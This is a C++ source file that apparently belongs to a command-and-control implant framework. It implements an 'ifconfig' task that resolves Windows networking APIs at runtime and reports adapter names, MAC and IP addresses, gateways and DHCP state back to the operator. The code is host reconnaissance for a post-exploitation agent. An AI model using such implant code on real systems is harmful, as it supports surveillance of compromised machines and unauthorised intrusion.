#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_IFCONFIG

using namespace stardust;
using namespace starburst;

typedef struct _IP_ADDR_STRING {
    struct _IP_ADDR_STRING* Next;
    char                    IpAddress[16];
    char                    IpMask[16];
    DWORD                   Context;
} IP_ADDR_STRING, *PIP_ADDR_STRING;

typedef struct _IP_ADAPTER_INFO {
    struct _IP_ADAPTER_INFO* Next;
    DWORD  ComboIndex;
    char   AdapterName[260];
    char   Description[132];
    UINT   AddressLength;
    BYTE   Address[8];
    DWORD  Index;
    UINT   Type;
    UINT   DhcpEnabled;
    PIP_ADDR_STRING CurrentIpAddress;
    IP_ADDR_STRING  IpAddressList;
    IP_ADDR_STRING  GatewayList;
    IP_ADDR_STRING  DhcpServer;
    BOOL   HaveWins;
    IP_ADDR_STRING  PrimaryWinsServer;
    IP_ADDR_STRING  SecondaryWinsServer;
    time_t LeaseObtained;
    time_t LeaseExpires;
} IP_ADAPTER_INFO, *PIP_ADAPTER_INFO;

typedef DWORD (WINAPI *fn_GetAdaptersInfo)( PIP_ADAPTER_INFO, PULONG );

auto declfn starburst::cmd_ifconfig(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
        symbol<LPCSTR>( "iphlpapi.dll" ) ) );
    if ( !h_iphlpapi ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "LoadLibrary iphlpapi failed" ) ) );
        return;
    }

    auto pGetAdaptersInfo = reinterpret_cast<fn_GetAdaptersInfo>(
        inst.kernel32.GetProcAddress( h_iphlpapi,
            symbol<LPCSTR>( "GetAdaptersInfo" ) ) );
    if ( !pGetAdaptersInfo ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetAdaptersInfo not found" ) ) );
        return;
    }

    ULONG buf_size = 0;
    pGetAdaptersInfo( nullptr, &buf_size );
    if ( buf_size == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no adapters" ) ) );
        return;
    }

    auto adapter_info = static_cast<PIP_ADAPTER_INFO>( inst.heap_alloc( buf_size ) );
    if ( !adapter_info ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    if ( pGetAdaptersInfo( adapter_info, &buf_size ) != 0 ) {
        inst.heap_free( adapter_info );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetAdaptersInfo failed" ) ) );
        return;
    }

    auto output = static_cast<char*>( inst.heap_alloc( 8192 ) );
    if ( !output ) {
        inst.heap_free( adapter_info );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }
    uint32_t off = 0;
    uint32_t cap = 8192;

    auto adapter = adapter_info;
    while ( adapter ) {
        // adapter description
        uint32_t desc_len = str_len( adapter->Description );
        if ( off + desc_len + 2 < cap ) {
            memory::copy( output + off, adapter->Description, desc_len );
            off += desc_len;
            output[off++] = '\n';
        }

        // MAC address
        if ( off + 40 < cap ) {
            str_copy( output + off, symbol<char*>( const_cast<char*>( "  MAC: " ) ) );
            off += 7;
            for ( UINT i = 0; i < adapter->AddressLength; i++ ) {
                char hex[4];
                uint8_t b = adapter->Address[i];
                char hex_chars[] = { '0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F' };
                hex[0] = hex_chars[(b >> 4) & 0xF];
                hex[1] = hex_chars[b & 0xF];
                hex[2] = ( i < adapter->AddressLength - 1 ) ? ':' : '\0';
                hex[3] = '\0';
                uint32_t hlen = str_len( hex );
                memory::copy( output + off, hex, hlen );
                off += hlen;
            }
            output[off++] = '\n';
        }

        // IP addresses
        auto ip_entry = &adapter->IpAddressList;
        while ( ip_entry ) {
            uint32_t ip_len = str_len( ip_entry->IpAddress );
            uint32_t mask_len = str_len( ip_entry->IpMask );
            if ( ip_len > 1 && off + ip_len + mask_len + 20 < cap ) {
                str_copy( output + off, symbol<char*>( const_cast<char*>( "  IP:  " ) ) );
                off += 7;
                memory::copy( output + off, ip_entry->IpAddress, ip_len );
                off += ip_len;
                str_copy( output + off, symbol<char*>( const_cast<char*>( " / " ) ) );
                off += 3;
                memory::copy( output + off, ip_entry->IpMask, mask_len );
                off += mask_len;
                output[off++] = '\n';
            }
            ip_entry = ip_entry->Next;
        }

        // gateway
        uint32_t gw_len = str_len( adapter->GatewayList.IpAddress );
        if ( gw_len > 1 && off + gw_len + 12 < cap ) {
            str_copy( output + off, symbol<char*>( const_cast<char*>( "  GW:  " ) ) );
            off += 7;
            memory::copy( output + off, adapter->GatewayList.IpAddress, gw_len );
            off += gw_len;
            output[off++] = '\n';
        }

        // DHCP
        if ( off + 20 < cap ) {
            if ( adapter->DhcpEnabled ) {
                str_copy( output + off, symbol<char*>( const_cast<char*>( "  DHCP: enabled\n" ) ) );
                off += 16;
            } else {
                str_copy( output + off, symbol<char*>( const_cast<char*>( "  DHCP: disabled\n" ) ) );
                off += 17;
            }
        }

        output[off++] = '\n';
        adapter = adapter->Next;
    }

    output[off] = '\0';
    inst.heap_free( adapter_info );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
